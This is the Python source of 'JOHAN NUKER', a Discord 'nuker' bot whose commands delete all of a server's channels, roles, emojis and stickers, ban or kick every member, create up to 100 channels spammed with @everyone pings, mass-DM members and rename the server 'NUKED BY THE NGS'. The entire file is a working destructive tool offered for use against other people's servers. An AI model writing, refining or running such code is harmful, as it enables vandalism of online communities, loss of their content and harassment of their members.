
# JOHAN NUKER | v1.5 | Developed by J0HAN

import discord, asyncio, random, time
from colorama import Fore

# TESTING
try:
    bot = discord.Client(intents=discord.Intents.all())
except:
    print("Looks like you don't have discord.py installed, run 'pip install -U discord.py' in your terminal to install it.\n")
    exit()
try:
    print(Fore.WHITE)
except:
    print("Looks like you don't have colorama installed, run 'pip install colorama' in your terminal to install it.\n")
    exit()

# COLORS
err = Fore.RED
wrn = Fore.YELLOW
scs = Fore.GREEN
dec = Fore.CYAN
otr = Fore.BLUE
dft = Fore.WHITE
hde = Fore.BLACK

# CONFIG
try:
    with open("config.txt") as file:
        tkn = file.readline()
        usrID = file.readline()
        prfx = file.readline()
except:
    print(f"{err}UNABLE TO LOCATE 'config.txt' FILE\n{dft}")
    exit()

print(hde)

# START-UP
@bot.event
async def on_ready():
    try:
        usr = await bot.fetch_user(usrID)
    except:
        usr = "Invalid"
    print(f"""{dec}
                           █████ ██████   █████ █████   ████ ███████████  
                          ░░███ ░░██████ ░░███ ░░███   ███░ ░░███░░░░░███ 
                           ░███  ░███░███ ░███  ░███  ███    ░███    ░███           {dft}┏︱Bot: {bot.user}{dec}
                           ░███  ░███░░███░███  ░███████     ░██████████            {dft}┠︱User: {usr}{dec}
                           ░███  ░███ ░░██████  ░███░░███    ░███░░░░░███           {dft}┠︱Server: W.I.P.{dec}
                     ███   ░███  ░███  ░░█████  ░███ ░░███   ░███    ░███           {dft}┗︱Prefix: {prfx}{dec}
                    ░░████████   █████  ░░█████ █████ ░░████ █████   █████
                     ░░░░░░░░   ░░░░░    ░░░░░ ░░░░░   ░░░░ ░░░░░   ░░░░░ 
""")

# MESSAGE RESPONDER
@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    msg = message.content.lower()
    ctx = message.guild
    dbg_on = True
    if msg.endswith("--clean"):
        dbg_on = False

    # Creating
    async def mcp(amt, c_name, spm):
        if dbg_on == True:
            print(f"{dft}\n▼ Beginning mass channel ping...")
        c_made = 0
        strt = time.time()
        while int(c_made) < int(amt):
            try:
                new_channel = await ctx.create_text_channel(c_name)
                c_made += 1
                if dbg_on == True:
                    print(f"{scs}✚ Text channel created! ({c_made}/{amt})")
                try:
                    loop = asyncio.get_event_loop()
                    loop.create_task(ms(random.randint(1,4), new_channel, "@everyone" + spm))
                except:
                    print(f"{wrn}━ Unable to start spamming messages.")
            except:
                print(f"{wrn}━ Unable to create text channel.")
        print(f"{dft}▲ Mass channel ping has been finished with {c_made} channels being made. ({str(time.time()-strt)}s)")
    async def mc(amt, c_name):
        if dbg_on == True:
            print(f"{dft}\n▼ Mass channel creation is in progress...")
        c_made = 0
        start = time.time()
        while c_made < amt:
            try:
                await ctx.create_text_channel(c_name)
                c_made += 1
                if dbg_on == True:
                    print(f"{scs}✚ Text channel created! ({c_made}/{amt})")
            except:
                print(f"{wrn}━ Unable to create text channel.")
        print(f"{dft}▲ Mass channel creation has been finished with {c_made} channels being made. ({str(time.time()-start)}s)")
    async def mr(amt, r_name):
        if dbg_on == True:
            print(f"{dft}\n▼ Mass role creation is in progress...")
        r_created = 0
        start = time.time()
        while r_created < amt:
            try:
                await ctx.create_role(name=r_name)
                r_created += 1
                if dbg_on == True:
                
                    print(f"{scs}✚ Role created! ({r_created}/{amt})")
            except:
                print(f"{wrn}━ Unable to create role.")
        print(f"{dft}▲ Mass role creation has been finished with {r_created} roles being made. ({str(time.time()-start)}s)")

    # Deleting
    async def dc():
        print(f"{dft}\n▼ Deleting all the channels...")
        c_del = 0
        tl_c = len(ctx.channels)
        strt = time.time()
        for c in ctx.channels:
            try:
                await c.delete()
                c_del += 1
                if dbg_on == True:
                    print(f"{scs}✚ Channel deleted! ({c_del}/{tl_c})")
            except:
                print(f"{wrn}━ Unable to delete channel.")
        print(f"{dft}▲ {c_del} out of {tl_c} channels have been deleted. ({str(time.time()-strt)}s)")
    async def dr():
        if dbg_on == True:
            print(f"{dft}\n▼ Deleting all the roles...")
        r_del = 0
        tl_r = len(ctx.roles)
        strt = time.time()
        for r in ctx.roles:
            try:
                await r.delete()
                r_del += 1
                if dbg_on == True:
                    print(f"{scs}✚ Role deleted! ({r_del}/{tl_r})")
            except:
                print(f"{wrn}━ Unable to delete role.")
        print(f"{dft}▲ {r_del} out of {tl_r} roles have been deleted. ({str(time.time()-strt)}s)")
    async def de():
        if dbg_on == True:
            print(f"{dft}\nDeleting all the emojis...")
        e_del = 0
        tl_e = len(ctx.emojis)
        strt = time.time()
        for e in ctx.emojis:
            try:
                await e.delete()
                e_del += 1
                if dbg_on == True:
                    print(f"{scs}✚ Emoji deleted! ({e_del}/{tl_e})")
            except:
                print(f"{wrn}━ Unable to delete emoji.")
        print(f"{dft}▲ {e_del} out of {tl_e} roles have been deleted. ({str(time.time()-strt)}s)")
    async def ds():
        s_deleted = 0
        total_s = len(ctx.stickers)
        start = time.time()
        for s in ctx.stickers:
            try:
                await s.delete()
                s_deleted += 1
                if dbg_on == True:
                    print(f"{scs}✚ Sticker deleted! ({s_deleted}/{total_s})")
            except:
                print(f"{wrn}━ Unable to delete sticker.")
        print(f"{dft}▲ {s_deleted} out of {total_s} roles have been deleted. ({str(time.time()-start)}s)")

    # Member Stuff
    async def be():
        print(f"{dft}\n▼ Banning everyone...")
        m_banned = 0
        total_m = len(ctx.members)
        start = time.time()
        for m in ctx.members:
            try:
                await m.ban(reason="NUKED BY THE NGS")
                m_banned += 1
                if dbg_on == True:
                    print(f"{scs}✚ Member has been banned! ({m_banned}/{total_m})")
            except:
                print(f"{wrn}━ Unable to ban member.")
        print(f"{dft}▲ {m_banned} out of {total_m} members have been banned. ({str(time.time()-start)}s)")
    async def ke():
        print(f"{dft}\n▼ Kicking everyone...")
        m_kicked = 0
        total_m = len(ctx.members)
        start = time.time()
        for m in ctx.members:
            try:
                await m.kick(reason="NUKED BY THE NGS")
                m_kicked += 1
                print(f"{scs}✚ Member has been kicked! ({m_kicked}/{total_m})")
            except:
                print(f"{wrn}━ Unable to kick member.")
        print(f"{dft}▲ {m_kicked} out of {total_m} members have been kicked. ({str(time.time()-start)}s)")

    # Other
    async def ms(amount, channel, message):
        msgs = 0
        while msgs < amount:
            try:
                await channel.send(message)
                msgs += 1
            except:
                print(f"{wrn}━ Unable to send spam message.")
    async def dm(message):
        print(f"{dft}\n▼ DMing everyone...")
        d_sent = 0
        total_m = len(ctx.members)
        start = time.time()
        for m in ctx.members:
            try:
                dm = await m.create_dm()
                loop = asyncio.get_event_loop()
                loop.create_task(ms(1, dm, message))
                d_sent += 1
                if dbg_on == True:
                    print(f"✚ DM has been sent! ({d_sent}/{total_m})")
            except:
                print(f"{wrn}━ Unable to send DM.")
        print(f"{dft}▲ {d_sent} out of {total_m} members have been DMed. ({str(time.time()-start)}s)")
    async def hide():
        print(f"{dft}\n◄ Hider function has been used.")
        try:
            await bot.change_presence(status=discord.Status.offline)
            await asyncio.sleep(1)
            await bot.change_presence(status=discord.Status.online)
            print(f"{scs}✚ The hiding function seems to be able to work!")
            while True:
                try:
                    await bot.change_presence(status=discord.Status.offline)
                    await asyncio.sleep(1)
                    await bot.change_presence(status=discord.Status.online)
                    await asyncio.sleep(1)
                except:
                    print(f"{wrn}\nHider has broke, it has now been cancelled.")
                    break
        except:
            print(f"{wrn}━ The hider doesn't seem like it's able to work.")

    # COMMANDS
    try:
        if msg.startswith(f"{prfx}help"):
            print(f"{dft}\n◄ The help command has been used.")
            embed = discord.Embed(title="JOHAN NUKER | v1.5", description=f"""**Commands:**
* {prfx}nuke [y/n] - Automatic nuke that uses: del, mcp, mr, dm, and optionally be¹
* {prfx}mcp [amount] [name] [message] - Creates channels and then sends 1-4 messages in them²*
* {prfx}channels [amount] [name] - Creates a specified amount of channels with the given name
* {prfx}roles [amount] [name] - Creates a certain amount of roles with whatever name you want
* {prfx}del - Deletes all channels, roles, emojis, and stickers
* {prfx}cdel - Deletes all the channels
* {prfx}rdel - Deletes all the roles
* {prfx}edel - Deletes all the emojis
* {prfx}sdel - Deletes all the stickers
* {prfx}ban - Bans everyone
* {prfx}kick - Kicks everyone
* {prfx}spam [amount] [message] - Spams a number of messages in the channel you sent the command
* {prfx}dmall [amount] [message] - DMs every server member a message once
* {prfx}hide - Changes status from online to offline every second (may slow down other functions)*
¹If you'd like to ban everyone at the end then send the command as '{prfx}ban y'.
²No need to add everyone ping, it is automatically added at the start of the message with a space after.

Tip: Add '--clean' after a command to turn off logging messages in terminal (doesn't work for commands that have an asterisk after).""", colour=0x336EFF)
            embed.set_author(name=message.author, icon_url=message.author.avatar)
            embed.set_footer(text="Developed by J0HAN")
            try:
                await message.reply(embed=embed)
                print(f"{scs}✚ Help message successfully sent!")
            except:
                print(f"{wrn}━ Unable to send help message.")
        elif msg.startswith(f"{prfx}nuke"):
            print(f"{otr}\n► NUKE STARTED\n")
            dbg_on = False
            cmdN = msg.split(" ")
            await ctx.edit(name=f"NUKED BY THE NGS")
            loop = asyncio.get_event_loop()
            loop.create_task(dc())
            loop.create_task(dr()) # Note: Discord really doesn't like you creating/deleting a lot of roles quickly
            await asyncio.gather(mcp(100, "johan-was-here", "SERVER NUKED BY THE NGS"), mr(50, "NUKED BY THE NGS"), de(), ds())
            if len(cmdN) > 1:
                if cmdN[1] == "y":
                    await be()
            dbg_on = True
            print(f"{otr}\n► NUKE OVER")

        # Creation
        elif msg.startswith(f"{prfx}mcp"):
            dbg_on = False
            cmd = msg.split(" ", 3)
            if len(cmd) > 3:
                try:
                    amount = int(cmd[1])
                    await mcp(amount, cmd[2], cmd[3])
                except:
                    await message.reply("Please enter a valid number for the amount.")
            else:
                await message.reply("Please enter all required arguments.")
            dbg_on = True
        elif msg.startswith(f"{prfx}channels"):
            cmdC = msg.split(" ", 2)
            if len(cmdC) > 2:
                try:
                    amountC = int(cmdC[1])
                    await mc(amountC, cmdC[2])
                except:
                    await message.reply("Please enter a valid number for the amount.")
            else:
                await message.reply("Please enter all required arguments.")
        elif msg.startswith(f"{prfx}roles"):
            cmdR = msg.split(" ", 2)
            if len(cmdR) > 2:
                try:
                    amountR = int(cmdR[1])
                    await mr(amountR, cmdR[2])
                except:
                    await message.reply("Please enter a valid number for the amount.")
            else:
                await message.reply("Please enter all required arguments.")

        # Deletion
        elif msg.startswith(f"{prfx}del"):
            print(f"\n{otr}► MASS DELELTION STARTED")
            dbg_on = False
            await asyncio.gather(dc(), dr(), de(), ds())
            dbg_on = True
            print(f"{otr}\n► MASS DELETION OVER")
        elif msg.startswith(f"{prfx}cdel"):
            await dc()
        elif msg.startswith(f"{prfx}rdel"):
            await dr()
        elif msg.startswith(f"{prfx}edel"):
            await de()
        elif msg.startswith(f"{prfx}sdel"):
            await ds()
        elif msg.startswith(f"{prfx}ban"):
            await be()
        elif msg.startswith(f"{prfx}kick"):
            await ke()
        elif msg.startswith(f"{prfx}dmall"):
            dbg_on = False
            cmdD = msg.split(" ", 1)
            if len(cmdD) > 1:
                    await dm(cmdD[1])
            else:
                await message.reply("Please enter all required arguments.")
            dbg_on = True
        elif msg.startswith(f"{prfx}spam"):
            cmdS = msg.split(" ", 2)
            if len(cmdS) > 2:
                try:
                    amountS = int(cmdS[1])
                    await ms(amountS, message.channel, cmdS[2])
                except:
                    await message.reply("Please enter a valid number for the amount.")
            else:
                await message.reply("Please enter all required arguments.")
        elif msg.startswith(f"{prfx}hide"):
            await hide()
    except:
        print(f"{wrn}\nAn execution error has occured.")
try:
    bot.run(tkn)
except:
    print(f"{err}INVALID TOKEN GIVEN\n{dft}")
